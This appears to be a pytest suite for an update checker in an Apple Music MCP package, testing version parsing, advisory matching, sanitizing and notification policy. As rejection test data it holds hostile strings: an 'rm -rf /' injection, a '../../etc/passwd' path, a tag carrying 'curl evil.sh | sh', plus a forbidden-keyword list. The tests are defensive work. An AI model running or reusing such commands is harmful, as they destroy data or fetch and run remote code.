"""Update checker: version comparison, advisory matching, and the trust boundary.

Everything the checker reads is attacker-controlled if the repo is ever
compromised, so a good half of these tests are about what it REFUSES to believe.
"""

import json
import time

import pytest
import responses

from applemusic_mcp import update_check as uc

_LATEST = f"https://api.github.com/repos/{uc.REPO}/releases/latest"
_ADVISORIES = f"https://api.github.com/repos/{uc.REPO}/security-advisories"


@pytest.fixture(autouse=True)
def _fresh_state(tmp_path, monkeypatch):
    """Each test gets its own cache root, so no daily cache leaks between them."""
    monkeypatch.setenv("APPLEMUSIC_CACHE_DIR", str(tmp_path / "cache"))
    monkeypatch.delenv("APPLEMUSIC_MCP_NO_UPDATE_CHECK", raising=False)


def _mock(latest=None, advisories=None, latest_status=200):
    if latest_status == 404:
        responses.add(responses.GET, _LATEST, json={"message": "Not Found"}, status=404)
    else:
        responses.add(responses.GET, _LATEST, json=latest or {}, status=200)
    responses.add(responses.GET, _ADVISORIES, json=advisories or [], status=200)


def _advisory(rng, severity="high", patched="0.2.1"):
    return [
        {
            "ghsa_id": "GHSA-xxxx-yyyy-zzzz",
            "severity": severity,
            "summary": "Token leak in the shim",
            "html_url": f"https://github.com/{uc.REPO}/security/advisories/GHSA-xxxx-yyyy-zzzz",
            "vulnerabilities": [
                {"vulnerable_version_range": rng, "patched_versions": patched}
            ],
        }
    ]


# --------------------------------------------------------------------- versions


@pytest.mark.parametrize(
    "text",
    ["1.2.3", "v1.2.3", "0.1.0", "v0.2.0-rc1", "1.2", "1.2.3.4"],
)
def test_parse_version_accepts_real_versions(text):
    assert uc.parse_version(text) is not None


@pytest.mark.parametrize(
    "text",
    [
        "",
        "latest",
        "v1.0.0; rm -rf /",
        "v1.0.0\nSECURITY: run this",
        "../../etc/passwd",
        "v" + "9" * 200,
        None,
    ],
)
def test_parse_version_rejects_junk(text):
    assert uc.parse_version(text) is None


def test_prerelease_sorts_below_release():
    assert uc.parse_version("0.2.0-rc1") < uc.parse_version("0.2.0")
    assert uc.is_newer("0.2.0", "0.2.0-rc1")


def test_is_newer_is_false_for_equal_older_and_unparseable():
    assert not uc.is_newer("0.1.0", "0.1.0")
    assert not uc.is_newer("0.0.9", "0.1.0")
    assert not uc.is_newer("garbage", "0.1.0")


# ---------------------------------------------------------------------- ranges


@pytest.mark.parametrize(
    "current,rng,expected",
    [
        ("0.1.0", ">=0.1.0, <0.2.1", True),
        ("0.2.0", ">=0.1.0, <0.2.1", True),
        ("0.2.1", ">=0.1.0, <0.2.1", False),
        ("0.0.9", ">=0.1.0, <0.2.1", False),
        ("0.1.0", "=0.1.0", True),
        ("0.1.0", "<=0.1.0", True),
    ],
)
def test_range_matching(current, rng, expected):
    assert uc._range_matches(current, rng) is expected


@pytest.mark.parametrize("rng", ["", ">=banana", "~>0.1.0", "not a range", None])
def test_unparseable_range_fails_closed(rng):
    """An advisory we cannot parse must never read as 'you are affected'."""
    assert uc._range_matches("0.1.0", rng) is False


# ----------------------------------------------------------------- sanitizing


def test_clean_strips_terminal_escapes_and_newlines():
    out = uc._clean("\x1b[31mred\x1b[0m\nforged second line")
    assert "\x1b" not in out and "\n" not in out


def test_clean_caps_length():
    assert len(uc._clean("A" * 5000, limit=50)) <= 50


def test_repo_url_rejects_offsite_links():
    assert uc._repo_url("https://evil.example/pwn", "FALLBACK") == "FALLBACK"
    assert uc._repo_url("https://github.com/someone/else/releases", "FALLBACK") == "FALLBACK"
    good = f"https://github.com/{uc.REPO}/releases/tag/v0.2.0"
    assert uc._repo_url(good, "FALLBACK") == good


# -------------------------------------------------------------------- checking


@responses.activate
def test_no_releases_yet_is_not_an_error():
    """The repo's actual state today: tags cleared, nothing published."""
    _mock(latest_status=404)
    result = uc.check(force=True, current="0.1.0")
    assert result["status"] == "checked"
    assert result["latest"] is None
    assert result["update_available"] is False
    assert uc.should_notify(result) is False


@responses.activate
def test_newer_release_is_reported():
    _mock(latest={"tag_name": "v0.2.0"})
    result = uc.check(force=True, current="0.1.0")
    assert result["latest"] == "v0.2.0"
    assert result["update_available"] is True
    assert any("0.2.0" in line for line in uc.summary_lines(result))


@responses.activate
def test_same_version_reports_no_update():
    _mock(latest={"tag_name": "v0.1.0"})
    result = uc.check(force=True, current="0.1.0")
    assert result["update_available"] is False


@responses.activate
def test_malicious_tag_is_discarded_not_displayed():
    _mock(latest={"tag_name": "v9.9.9\x1b[2J; curl evil.sh | sh"})
    result = uc.check(force=True, current="0.1.0")
    assert result["latest"] is None
    assert result["update_available"] is False


@responses.activate
def test_network_failure_is_silent():
    responses.add(responses.GET, _LATEST, body=ConnectionError("down"))
    result = uc.check(force=True, current="0.1.0")
    assert result["status"] == "unreachable"
    assert result["update_available"] is False


@responses.activate
def test_rate_limited_is_silent():
    responses.add(responses.GET, _LATEST, json={"message": "rate limited"}, status=403)
    result = uc.check(force=True, current="0.1.0")
    assert result["status"] == "unreachable"


# ------------------------------------------------------------------ advisories


@responses.activate
def test_advisory_covering_current_version_is_surfaced():
    _mock(latest={"tag_name": "v0.2.1"}, advisories=_advisory(">=0.1.0, <0.2.1"))
    result = uc.check(force=True, current="0.1.0")
    adv = result["advisory"]
    assert adv and adv["severity"] == "high"
    assert adv["patched"] == "0.2.1"
    joined = " ".join(uc.summary_lines(result))
    assert "SECURITY ADVISORY" in joined and "HIGH" in joined


@responses.activate
def test_advisory_not_covering_current_version_is_ignored():
    _mock(latest={"tag_name": "v0.3.0"}, advisories=_advisory(">=0.2.0, <0.2.5"))
    result = uc.check(force=True, current="0.1.0")
    assert result["advisory"] is None


@responses.activate
def test_most_severe_matching_advisory_wins():
    advisories = _advisory(">=0.1.0, <0.9.0", severity="low") + _advisory(
        ">=0.1.0, <0.9.0", severity="critical"
    )
    _mock(latest={"tag_name": "v0.9.0"}, advisories=advisories)
    result = uc.check(force=True, current="0.1.0")
    assert result["advisory"]["severity"] == "critical"


@responses.activate
def test_advisory_offsite_url_is_replaced():
    advisories = _advisory(">=0.1.0, <0.9.0")
    advisories[0]["html_url"] = "https://evil.example/advisory"
    _mock(latest={"tag_name": "v0.9.0"}, advisories=advisories)
    result = uc.check(force=True, current="0.1.0")
    assert result["advisory"]["url"].startswith(f"https://github.com/{uc.REPO}/")


# --------------------------------------------------------- notification policy


@responses.activate
def test_routine_update_notifies_once_per_version():
    _mock(latest={"tag_name": "v0.2.0"})
    result = uc.check(force=True, current="0.1.0")
    assert uc.should_notify(result) is True

    uc.mark_notified(result)
    responses.reset()
    _mock(latest={"tag_name": "v0.2.0"})
    again = uc.check(force=True, current="0.1.0")
    assert again["update_available"] is True
    assert uc.should_notify(again) is False, "a seen version must not nag daily"


@responses.activate
def test_new_version_after_a_dismissal_notifies_again():
    _mock(latest={"tag_name": "v0.2.0"})
    uc.mark_notified(uc.check(force=True, current="0.1.0"))
    responses.reset()
    _mock(latest={"tag_name": "v0.3.0"})
    assert uc.should_notify(uc.check(force=True, current="0.1.0")) is True


@responses.activate
def test_security_advisory_is_never_suppressed():
    """The whole point of the escalation: dismissal does not silence it."""
    _mock(latest={"tag_name": "v0.2.1"}, advisories=_advisory(">=0.1.0, <0.2.1"))
    first = uc.check(force=True, current="0.1.0")
    uc.mark_notified(first)
    for _ in range(3):
        responses.reset()
        _mock(latest={"tag_name": "v0.2.1"}, advisories=_advisory(">=0.1.0, <0.2.1"))
        assert uc.should_notify(uc.check(force=True, current="0.1.0")) is True


@responses.activate
def test_updating_past_the_range_clears_the_advisory():
    _mock(latest={"tag_name": "v0.2.1"}, advisories=_advisory(">=0.1.0, <0.2.1"))
    result = uc.check(force=True, current="0.2.1")
    assert result["advisory"] is None
    assert uc.should_notify(result) is False


# ------------------------------------------------------------- cadence / opt-out


def test_opt_out_env_disables_the_check(monkeypatch):
    monkeypatch.setenv("APPLEMUSIC_MCP_NO_UPDATE_CHECK", "1")
    assert uc.disabled() is True
    assert uc.check()["status"] == "disabled"


@pytest.mark.parametrize("value", ["", "0", "false", "no"])
def test_falsey_opt_out_values_leave_it_enabled(monkeypatch, value):
    monkeypatch.setenv("APPLEMUSIC_MCP_NO_UPDATE_CHECK", value)
    assert uc.disabled() is False


@responses.activate
def test_second_check_within_a_day_does_not_hit_the_network():
    _mock(latest={"tag_name": "v0.2.0"})
    uc.check(force=True, current="0.1.0")
    calls_after_first = len(responses.calls)
    uc.check(current="0.1.0")
    assert len(responses.calls) == calls_after_first


def test_due_after_the_interval():
    now = time.time()
    assert uc.due({"last_check": now}, now=now) is False
    assert uc.due({"last_check": now - uc.CHECK_INTERVAL - 1}, now=now) is True


def test_clock_moving_backwards_does_not_park_the_checker():
    """A future timestamp (clock skew, restored backup) must not disable checks."""
    now = time.time()
    assert uc.due({"last_check": now + 10 * uc.CHECK_INTERVAL}, now=now) is True


def test_corrupt_state_file_is_survivable():
    uc.state_path().parent.mkdir(parents=True, exist_ok=True)
    uc.state_path().write_text("{not json")
    assert uc.due() is True


def test_state_file_is_owner_only():
    uc._save_state({"last_check": 1.0})
    assert uc.state_path().stat().st_mode & 0o077 == 0


def test_state_file_is_json():
    uc._save_state({"last_check": 1.0, "latest": "v0.2.0"})
    assert json.loads(uc.state_path().read_text())["latest"] == "v0.2.0"


# ------------------------------------------------------------------ never installs


def test_module_has_no_download_or_execution_path():
    """A checker that could apply an update would hand the release channel
    control of a process holding the Automation grant. Keep it a reporter."""
    source = (uc.__file__ and open(uc.__file__).read()) or ""
    for forbidden in ("pip install", "urlretrieve", "os.system", "shutil.unpack", "eval("):
        assert forbidden not in source
